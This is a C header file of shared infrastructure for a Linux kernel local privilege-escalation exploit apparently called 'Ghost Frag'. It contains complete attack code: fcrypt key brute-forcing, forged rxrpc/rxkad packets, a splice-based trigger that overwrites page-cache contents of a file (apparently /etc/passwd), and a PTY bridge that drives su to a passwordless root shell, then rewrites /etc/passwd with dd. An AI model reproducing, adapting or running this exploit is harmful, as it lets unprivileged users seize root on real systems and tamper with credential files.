//
// ghost_frag_common.h - Shared exploit infrastructure for Ghost Frag
//
// fcrypt, brute-force, rxrpc/rxkad, AF_ALG, trigger logic, su PTY bridge.
//
#ifndef GHOST_FRAG_COMMON_H
#define GHOST_FRAG_COMMON_H

#define _GNU_SOURCE
#include <arpa/inet.h>
#include <endian.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_alg.h>
#include <linux/keyctl.h>
#include <linux/rxrpc.h>
#include <net/if.h>
#include <netinet/in.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdarg.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <termios.h>
#include <time.h>
#include <unistd.h>

#ifndef AF_RXRPC
#define AF_RXRPC  33
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG   279
#endif
#ifndef AF_ALG
#define AF_ALG    38
#endif

#define RXRPC_TYPE_DATA       1
#define RXRPC_TYPE_CHALLENGE  6
#define RXRPC_LAST_PACKET     0x04
#define RXRPC_CHANNELMASK     3
#define RXRPC_CIDSHIFT        2

struct rxrpc_wire_header {
    uint32_t epoch, cid, callNumber, seq, serial;
    uint8_t  type, flags, userStatus, securityIndex;
    uint16_t cksum, serviceId;
} __attribute__((packed));

struct rxkad_challenge {
    uint32_t version, nonce, min_level, __pad;
} __attribute__((packed));

#define LOG(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)

// == fcrypt (userspace, from crypto/fcrypt.c) ==

#include "fcrypt_sbox.h"

static uint32_t fc_sbox0[256], fc_sbox1[256];
static uint32_t fc_sbox2[256], fc_sbox3[256];

static void fcrypt_init_sboxes(void)
{
    for (int i = 0; i < 256; i++) {
        fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
        fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
                               ((uint32_t)fc_sbox1_raw[i] >> 5));
        fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
        fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
    }
}

#define fc_ror56_64(k, n) \
    (k = (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))

typedef struct { uint32_t sched[16]; } fcrypt_ctx;

static void fcrypt_setkey(fcrypt_ctx *ctx, const uint8_t key[8])
{
    uint64_t k = 0;
    for (int i = 0; i < 8; i++)
        k = (k << 7) | (uint64_t)(key[i] >> 1);
    for (int i = 0; i < 16; i++) {
        ctx->sched[i] = htobe32((uint32_t)k);
        if (i < 15) fc_ror56_64(k, 11);
    }
}

#define FC_F(R, L, s) do {                             \
    union { uint32_t l; uint8_t c[4]; } u;             \
    u.l = (s) ^ (R);                                   \
    L ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^         \
         fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];          \
} while (0)

static void fcrypt_decrypt(const fcrypt_ctx *ctx,
                           uint8_t out[8], const uint8_t in[8])
{
    uint32_t L, R;
    memcpy(&L, in, 4);
    memcpy(&R, in + 4, 4);
    for (int i = 15; i >= 0; i -= 2) {
        FC_F(L, R, ctx->sched[i]);
        FC_F(R, L, ctx->sched[i - 1]);
    }
    memcpy(out, &L, 4);
    memcpy(out + 4, &R, 4);
}

// == Brute-force key search ==

typedef int (*check_fn)(const uint8_t P[8]);

static int check_colons(const uint8_t P[8])
    { return P[0] == ':' && P[1] == ':'; }

static int check_zero_colon(const uint8_t P[8])
    { return P[0] == '0' && P[1] == ':'; }

static int check_gecos(const uint8_t P[8])
{
    if (P[0] != '0' || P[1] != ':' || P[7] != ':') return 0;
    for (int i = 2; i < 7; i++)
        if (P[i] == ':' || P[i] == 0 || P[i] == '\n') return 0;
    return 1;
}

static uint64_t splitmix64(uint64_t *s)
{
    uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
    z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
    z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
    return z ^ (z >> 31);
}

static int find_key(const uint8_t C[8], check_fn check,
                    uint8_t K_out[8], uint8_t P_out[8],
                    uint64_t seed, const char *label)
{
    fcrypt_ctx ctx;
    uint8_t K[8], P[8];
    struct timespec t0, t1;
    clock_gettime(CLOCK_MONOTONIC, &t0);
    for (uint64_t i = 0; i < 10000000000ULL; i++) {
        uint64_t r = splitmix64(&seed);
        memcpy(K, &r, 8);
        fcrypt_setkey(&ctx, K);
        fcrypt_decrypt(&ctx, P, C);
        if (check(P)) {
            memcpy(K_out, K, 8);
            memcpy(P_out, P, 8);
            clock_gettime(CLOCK_MONOTONIC, &t1);
            LOG("%s found after %lu iters (%.2fs)", label,
                (unsigned long)i,
                (t1.tv_sec-t0.tv_sec) + (t1.tv_nsec-t0.tv_nsec)/1e9);
            return 0;
        }
    }
    ERR("%s: search space exhausted", label);
    return -1;
}

// == Helpers ==

static int write_proc(const char *path, const char *fmt, ...)
{
    int fd = open(path, O_WRONLY);
    if (fd < 0) return -1;
    char buf[256];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    write(fd, buf, n);
    close(fd);
    return 0;
}

static int run_cmd(const char *fmt, ...)
{
    char cmd[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(cmd, sizeof(cmd), fmt, ap);
    va_end(ap);
    return system(cmd);
}

static void enable_sg(const char *dev)
{
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    // Try legacy ETHTOOL_SSG (0x19), then ETHTOOL_SFEATURES (0x3b)
    struct { uint32_t cmd; uint32_t data; } legacy = { 0x19, 1 };
    ifr.ifr_data = (char *)&legacy;
    if (ioctl(s, 0x8946, &ifr) == 0) { close(s); return; }

    struct { uint32_t cmd, size; struct { uint32_t v, r; } f[2]; }
        sf = { .cmd = 0x3b, .size = 2 };
    sf.f[0].v = 1; sf.f[0].r = 1;
    ifr.ifr_data = (char *)&sf;
    ioctl(s, 0x8946, &ifr);
    close(s);
}

// == User namespace setup ==

static int setup_userns(void)
{
    uid_t uid = getuid();
    gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
        ERR("unshare(NEWUSER|NEWNET): %s", strerror(errno));
        return -1;
    }
    write_proc("/proc/self/setgroups", "deny");
    char m[64];
    snprintf(m, sizeof(m), "0 %u 1", uid);
    write_proc("/proc/self/uid_map", m);
    snprintf(m, sizeof(m), "0 %u 1", gid);
    write_proc("/proc/self/gid_map", m);

    // Bring up loopback
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr = {0};
    strcpy(ifr.ifr_name, "lo");
    ifr.ifr_flags = IFF_UP | IFF_RUNNING;
    ioctl(s, SIOCSIFFLAGS, &ifr);
    struct sockaddr_in *la = (struct sockaddr_in *)&ifr.ifr_addr;
    la->sin_family = AF_INET;
    la->sin_addr.s_addr = htonl(0x7f000001);
    ioctl(s, SIOCSIFADDR, &ifr);
    close(s);
    return 0;
}

// == rxrpc session key ==

static uint8_t g_session_key[8];

static int build_rxrpc_token(uint8_t *out)
{
    uint8_t *p = out;
    uint32_t now = (uint32_t)time(NULL);

    *(uint32_t *)p = htonl(0);  p += 4;                   // sec index
    const char *cell = "evil";
    uint32_t clen = (uint32_t)strlen(cell);
    *(uint32_t *)p = htonl(clen);  p += 4;
    memcpy(p, cell, clen);
    uint32_t pad = (4 - (clen & 3)) & 3;
    memset(p + clen, 0, pad);  p += clen + pad;
    *(uint32_t *)p = htonl(1);  p += 4;                   // 1 token
    uint8_t *toklen_p = p;  p += 4;
    uint8_t *tokstart = p;
    *(uint32_t *)p = htonl(2);      p += 4;               // kvno
    *(uint32_t *)p = htonl(0);      p += 4;               // ticket_len
    *(uint32_t *)p = htonl(1);      p += 4;               // key type
    memcpy(p, g_session_key, 8);    p += 8;               // session key
    *(uint32_t *)p = htonl(now);    p += 4;               // begin
    *(uint32_t *)p = htonl(now + 86400); p += 4;          // expiry
    *(uint32_t *)p = htonl(1);      p += 4;               // primary
    *(uint32_t *)p = htonl(8);      p += 4;               // ticket_len
    memset(p, 0xCC, 8);             p += 8;               // dummy ticket
    *(uint32_t *)toklen_p = htonl((uint32_t)(p - tokstart));
    return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
    uint8_t buf[512];
    int n = build_rxrpc_token(buf);
    return syscall(SYS_add_key, "rxrpc", desc, buf, n, -2);
}

// == AF_ALG pcbc(fcrypt) ==

static int alg_pcbc_op(const uint8_t key[8], int op,
                       const uint8_t iv[8],
                       const void *in, size_t len, void *out)
{
    int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
    if (s < 0) return -1;
    struct sockaddr_alg sa = { .salg_family = AF_ALG };
    strcpy((char *)sa.salg_type, "skcipher");
    strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
    if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0)
        { close(s); return -1; }
    if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0)
        { close(s); return -1; }
    int fd = accept(s, NULL, NULL);
    if (fd < 0) { close(s); return -1; }

    char cbuf[CMSG_SPACE(4) + CMSG_SPACE(sizeof(struct af_alg_iv) + 8)];
    memset(cbuf, 0, sizeof(cbuf));
    struct msghdr msg = { .msg_control = cbuf, .msg_controllen = sizeof(cbuf) };
    struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
    c->cmsg_level = SOL_ALG;  c->cmsg_type = ALG_SET_OP;
    c->cmsg_len = CMSG_LEN(4); *(int *)CMSG_DATA(c) = op;
    c = CMSG_NXTHDR(&msg, c);
    c->cmsg_level = SOL_ALG;  c->cmsg_type = ALG_SET_IV;
    c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
    struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
    aiv->ivlen = 8;  memcpy(aiv->iv, iv, 8);
    struct iovec iov = { .iov_base = (void *)in, .iov_len = len };
    msg.msg_iov = &iov;  msg.msg_iovlen = 1;
    sendmsg(fd, &msg, 0);
    read(fd, out, len);
    close(fd);  close(s);
    return 0;
}

static void compute_csum_iv(uint32_t epoch, uint32_t cid,
                            const uint8_t key[8], uint8_t csum_iv[8])
{
    uint32_t in[4] = { htonl(epoch), htonl(cid), 0, htonl(2) };
    uint8_t out[16];
    alg_pcbc_op(key, ALG_OP_ENCRYPT, key, in, 16, out);
    memcpy(csum_iv, out + 8, 8);
}

static uint16_t compute_cksum(uint32_t cid, uint32_t call_id,
                              uint32_t seq, const uint8_t key[8],
                              const uint8_t csum_iv[8])
{
    uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
    x |= seq & 0x3fffffff;
    uint32_t in[2] = { htonl(call_id), htonl(x) };
    uint32_t out[2];
    alg_pcbc_op(key, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
    uint16_t v = (ntohl(out[1]) >> 16) & 0xffff;
    return v ? v : 1;
}

// == IPC ==

struct trigger_req {
    uint8_t  key[8];
    uint16_t port_S, svc_id;
    off_t    splice_off;
    size_t   splice_len;
};

struct trigger_ack { int ok; };

// == Child: fake rxrpc server + splice trigger ==

static int child_do_trigger(int ipc_fd, int file_fd)
{
    struct trigger_req req;
    if (read(ipc_fd, &req, sizeof(req)) != (ssize_t)sizeof(req))
        return -1;

    int udp = socket(AF_INET, SOCK_DGRAM, 0);
    struct sockaddr_in sa = {
        .sin_family = AF_INET,
        .sin_port = htons(req.port_S),
        .sin_addr.s_addr = inet_addr("10.0.0.2")
    };
    int one = 1;
    setsockopt(udp, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
    if (bind(udp, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
        LOG("child bind %d: %s", req.port_S, strerror(errno));
        close(udp);
        return -1;
    }

    struct trigger_ack ack = { .ok = 1 };
    write(ipc_fd, &ack, sizeof(ack));

    // Receive initial DATA, skip VERSION packets (type 13)
    uint8_t pkt[2048];
    struct sockaddr_in cli;
    socklen_t cli_len = sizeof(cli);
    ssize_t n = -1;
    struct rxrpc_wire_header *hdr = NULL;
    struct pollfd pfd = { .fd = udp, .events = POLLIN };

    for (int a = 0; a < 20; a++) {
        if (poll(&pfd, 1, 2000) <= 0) break;
        n = recvfrom(udp, pkt, sizeof(pkt), 0,
                     (struct sockaddr *)&cli, &cli_len);
        if (n < (ssize_t)sizeof(*hdr)) continue;
        hdr = (struct rxrpc_wire_header *)pkt;
        if (hdr->type == RXRPC_TYPE_DATA) break;
        LOG("child: skip type=%u (waiting for DATA)", hdr->type);
    }
    if (!hdr || hdr->type != RXRPC_TYPE_DATA) {
        LOG("child: no DATA packet received");
        close(udp);
        return -1;
    }

    uint32_t epoch = ntohl(hdr->epoch);
    uint32_t cid   = ntohl(hdr->cid);
    uint32_t callN = ntohl(hdr->callNumber);
    uint16_t svc   = ntohs(hdr->serviceId);
    LOG("child: DATA epoch=%x cid=%x call=%u", epoch, cid, callN);

    // Send CHALLENGE
    struct {
        struct rxrpc_wire_header h;
        struct rxkad_challenge   c;
    } __attribute__((packed)) ch = {0};
    ch.h.epoch = htonl(epoch);  ch.h.cid = htonl(cid);
    ch.h.serial = htonl(0x10000);
    ch.h.type = RXRPC_TYPE_CHALLENGE;  ch.h.securityIndex = 2;
    ch.h.serviceId = htons(svc);
    ch.c.version = htonl(2);  ch.c.nonce = htonl(0xDEADBEEF);
    ch.c.min_level = htonl(1);
    sendto(udp, &ch, sizeof(ch), 0, (struct sockaddr *)&cli, cli_len);
    LOG("child: sent CHALLENGE");

    // Drain RESPONSE + retransmits
    for (int i = 0; i < 6; i++) {
        if (poll(&pfd, 1, 500) <= 0) break;
        recvfrom(udp, pkt, sizeof(pkt), 0, NULL, NULL);
    }

    // Compute rxkad checksum
    uint8_t csum_iv[8];
    compute_csum_iv(epoch, cid, req.key, csum_iv);
    uint16_t cksum = compute_cksum(cid, callN, 1, req.key, csum_iv);

    // Build malicious DATA header
    struct rxrpc_wire_header mal = {0};
    mal.epoch = htonl(epoch);  mal.cid = htonl(cid);
    mal.callNumber = htonl(callN);  mal.seq = htonl(1);
    mal.serial = htonl(0x42000);
    mal.type = RXRPC_TYPE_DATA;  mal.flags = RXRPC_LAST_PACKET;
    mal.securityIndex = 2;  mal.cksum = htons(cksum);
    mal.serviceId = htons(svc);

    connect(udp, (struct sockaddr *)&(struct sockaddr_in){
        .sin_family = AF_INET,
        .sin_port   = cli.sin_port,
        .sin_addr   = cli.sin_addr
    }, sizeof(struct sockaddr_in));

    // vmsplice header + splice file data into pipe, splice to socket.
    // Page-cache pages enter skb frags with SKBFL_SHARED_FRAG set.
    // The forwarding layer strips the flag.
    int p[2];
    pipe(p);
    struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
    vmsplice(p[1], &viv, 1, 0);
    loff_t off = req.splice_off;
    splice(file_fd, &off, p[1], NULL, req.splice_len, 0);
    ssize_t sent = splice(p[0], NULL, udp, NULL,
                          sizeof(mal) + req.splice_len, 0);
    LOG("child: splice trigger sent=%zd", sent);
    close(p[0]);  close(p[1]);
    usleep(200000);
    close(udp);
    return 0;
}

// == Parent: rxrpc client trigger ==

static int parent_do_trigger(int ipc_fd, const uint8_t key[8],
                             uint16_t port_S, uint16_t svc_id,
                             off_t splice_off, size_t splice_len,
                             int tid)
{
    memcpy(g_session_key, key, 8);
    char kn[32];
    snprintf(kn, sizeof(kn), "gf%d", tid);
    long kid = add_rxrpc_key(kn);
    if (kid < 0) { LOG("add_key: %s", strerror(errno)); return -1; }

    struct trigger_req req = {0};
    memcpy(req.key, key, 8);
    req.port_S = port_S;  req.svc_id = svc_id;
    req.splice_off = splice_off;  req.splice_len = splice_len;
    write(ipc_fd, &req, sizeof(req));

    struct trigger_ack ack;
    read(ipc_fd, &ack, sizeof(ack));

    int rxsk = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
    if (rxsk < 0) { LOG("AF_RXRPC: %s", strerror(errno)); return -1; }
    setsockopt(rxsk, SOL_RXRPC, RXRPC_SECURITY_KEY, kn, strlen(kn));
    int sec = 1;
    setsockopt(rxsk, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL, &sec, sizeof(sec));

    struct sockaddr_rxrpc srx = {0};
    srx.srx_family = AF_RXRPC;
    srx.transport_type = SOCK_DGRAM;
    srx.transport_len  = sizeof(struct sockaddr_in);
    srx.transport.sin.sin_family = AF_INET;
    srx.transport.sin.sin_port   = htons(port_S + 1);
    srx.transport.sin.sin_addr.s_addr = inet_addr("10.0.0.1");
    bind(rxsk, (struct sockaddr *)&srx, sizeof(srx));

    struct sockaddr_rxrpc dst = {0};
    dst.srx_family = AF_RXRPC;  dst.srx_service = svc_id;
    dst.transport_type = SOCK_DGRAM;
    dst.transport_len  = sizeof(struct sockaddr_in);
    dst.transport.sin.sin_family = AF_INET;
    dst.transport.sin.sin_port   = htons(port_S);
    dst.transport.sin.sin_addr.s_addr = inet_addr("10.0.0.2");

    char data[8] = "HELLOAFS";
    struct iovec iov = { .iov_base = data, .iov_len = 8 };
    unsigned long ucid = 0xDEAD0000 + tid;
    char cb[CMSG_SPACE(sizeof(unsigned long))];
    struct msghdr msg = {
        .msg_name = &dst, .msg_namelen = sizeof(dst),
        .msg_iov = &iov, .msg_iovlen = 1,
        .msg_control = cb, .msg_controllen = sizeof(cb)
    };
    struct cmsghdr *cm = CMSG_FIRSTHDR(&msg);
    cm->cmsg_level = SOL_RXRPC;
    cm->cmsg_type  = RXRPC_USER_CALL_ID;
    cm->cmsg_len   = CMSG_LEN(sizeof(unsigned long));
    *(unsigned long *)CMSG_DATA(cm) = ucid;

    fcntl(rxsk, F_SETFL, fcntl(rxsk, F_GETFL) | O_NONBLOCK);
    sendmsg(rxsk, &msg, 0);

    // Drain responses
    for (int i = 0; i < 15; i++) {
        char rb[2048]; struct sockaddr_rxrpc rs; char cc[256];
        struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
        struct msghdr m = {
            .msg_name = &rs, .msg_namelen = sizeof(rs),
            .msg_iov = &iv, .msg_iovlen = 1,
            .msg_control = cc, .msg_controllen = sizeof(cc)
        };
        recvmsg(rxsk, &m, 0);
        usleep(100000);
    }

    close(rxsk);
    syscall(SYS_keyctl, 3, kid);
    return 0;
}

// == PTY bridge for su(1) ==

#define BACKUP_PATH "/tmp/.gf"

static char g_saved_line[256];
static int  g_saved_len;

static void save_backup(void)
{
    int fd = open(BACKUP_PATH, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd >= 0) { write(fd, g_saved_line, g_saved_len); close(fd); }
}

static int run_su_pty(void)
{
    int master = posix_openpt(O_RDWR | O_NOCTTY);
    if (master < 0 || grantpt(master) < 0 || unlockpt(master) < 0)
        return -1;
    char *sn = ptsname(master);
    struct winsize ws;
    if (ioctl(STDIN_FILENO, TIOCGWINSZ, &ws) == 0)
        ioctl(master, TIOCSWINSZ, &ws);

    pid_t pid = fork();
    if (pid == 0) {
        setsid();
        int sl = open(sn, O_RDWR);
        ioctl(sl, TIOCSCTTY, 0);
        dup2(sl, 0); dup2(sl, 1); dup2(sl, 2);
        if (sl > 2) close(sl);
        close(master);
        execlp("su", "su", NULL);
        _exit(127);
    }

    signal(SIGTTOU, SIG_IGN);
    signal(SIGTTIN, SIG_IGN);
    struct termios saved;
    int restore_term = (tcgetattr(STDIN_FILENO, &saved) == 0);
    if (restore_term) {
        struct termios raw = saved;
        cfmakeraw(&raw);
        tcsetattr(STDIN_FILENO, TCSANOW, &raw);
    }

    int pw_sent = 0, restored = 0, suppress = 0, ms = 0;
    char buf[4096];

    for (;;) {
        struct pollfd pf[2] = {
            { STDIN_FILENO, POLLIN, 0 },
            { master,       POLLIN, 0 }
        };
        poll(pf, 2, 200);
        ms += 200;

        if (pf[1].revents & POLLIN) {
            ssize_t nr = read(master, buf, sizeof(buf));
            if (nr <= 0) break;

            if (suppress > 0) {
                suppress--;
                int blank = 1;
                for (ssize_t j = 0; j < nr; j++)
                    if (buf[j] != '\r' && buf[j] != '\n' && buf[j] != ' ')
                        { blank = 0; break; }
                if (blank) continue;
                suppress = 0;
            }

            write(STDOUT_FILENO, buf, nr);

            if (!pw_sent) {
                buf[nr < (ssize_t)sizeof(buf) ? nr : 0] = 0;
                if (strstr(buf, "assword")) {
                    write(master, "\n", 1);
                    pw_sent = 1;
                    suppress = 2;
                }
            }

            // After root prompt appears, restore /etc/passwd via dd
            if (pw_sent && !restored) {
                buf[nr < (ssize_t)sizeof(buf) ? nr : 0] = 0;
                if (strchr(buf, '#') || strchr(buf, '$')) {
                    char cmd[256];
                    snprintf(cmd, sizeof(cmd),
                        "dd if=%s of=/etc/passwd bs=1 count=%d"
                        " conv=notrunc 2>/dev/null; rm -f %s\n",
                        BACKUP_PATH, g_saved_len, BACKUP_PATH);
                    write(master, cmd, strlen(cmd));
                    restored = 1;
                    suppress = 3;
                }
            }
        }

        if (pf[0].revents & POLLIN) {
            ssize_t nr = read(STDIN_FILENO, buf, sizeof(buf));
            if (nr <= 0) break;
            write(master, buf, nr);
        }

        if (pf[1].revents & (POLLHUP | POLLERR)) break;
        if (!pw_sent && ms >= 1500) {
            write(master, "\n", 1);
            pw_sent = 1;
            suppress = 2;
        }

        int st;
        if (waitpid(pid, &st, WNOHANG) == pid) {
            struct pollfd p = { master, POLLIN, 0 };
            while (poll(&p, 1, 50) > 0) {
                ssize_t nr = read(master, buf, sizeof(buf));
                if (nr <= 0) break;
                write(STDOUT_FILENO, buf, nr);
            }
            break;
        }
    }

    if (restore_term) tcsetattr(STDIN_FILENO, TCSANOW, &saved);
    close(master);
    return 0;
}

#endif // GHOST_FRAG_COMMON_H
